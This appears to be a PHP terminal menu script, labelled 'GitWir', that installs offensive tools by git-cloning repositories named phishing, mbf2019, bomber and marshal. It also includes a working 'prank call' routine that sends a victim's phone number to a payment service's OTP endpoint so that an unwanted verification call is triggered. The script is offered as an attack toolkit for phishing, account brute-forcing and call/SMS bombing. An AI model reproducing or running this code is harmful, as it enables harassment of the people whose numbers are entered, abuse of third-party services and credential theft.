<?php
$banner = "\033[94;1m  ____ _ _ __        ___\n / ___(_) |\ \      / (_)_ __\n| |  _| | __\ \ /\ / /| | '__|\n| |_| | | |_ \ V  V / | | |\n \____|_|\__| \_/\_/  |_|_|\n\033[91;1m   github.com/GitWir/install\n\n";
system('clear');
echo $banner;
echo "\n";
echo "\033[94;1m           Masukan Option\n";
echo "\033[92;1m[1] Tools Vip        [2] phising\n\033[93;1m[3] mbf2019          [4] bomber\n\033[91;1m[5] marshal python   [6] prank call\n\033[94;1m[7] Exit...\n   ";
echo "\033[95;1mroot./GitWir >>\033[96;1m ";
$pill = trim(fgets(STDIN));
if($pill == 1){
   echo "Sedang Menginstall...\n";
   system('sleep 1');
   system('git clone https://github.com/GitWir/rusmana');
   echo "\033[92;1m    Berhasil mengistall tools\n";
}
if($pill == 2){
   echo "Sedang menginstall...\n";
   system('sleep 1');
   system('git clone https://github.com/GitWir/phising');
   echo "\033[92;1m    Berhasil mengistall tools\n";
}
if($pill == 3){
   echo "Sedang menginstall...\n";;
   system('sleep 1');
   system('git clone https://github.com/GitWir/mbf2019');
   echo "\033[92;1m    Berhasil mengistall tools\n";
}
if($pill == 4){
   echo "Sedang menginstall...\n";
   system('sleep 1');
   system('git clone https://github.com/GitWir/bomb');
   echo "\033[92;1m    Berhasil mengistall tools\n";
}
if($pill == 5){
   echo "Sedang menginstall...\n";
   system('sleep 1');
   system('git clone https://github.com/GitWir/marshal');
   echo "\033[92;1m    Berhasil mengistall tools\n";
}
if($pill == 7){
   echo "\033[91;1mExiting...";
   system('sleep 1.5');
}
if($pill == 6){
   echo "Silahkan Tunggu...\n";
   system('sleep 2');
   echo "Nomor 628xxxx\nInput : ";
   $nomor = trim(fgets(STDIN));
   $execute = send($nomor);
   print $execute;
   function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
  $asw = curl_exec($ch);
        curl_close($ch);
        echo $asw."\n";
}}
?>
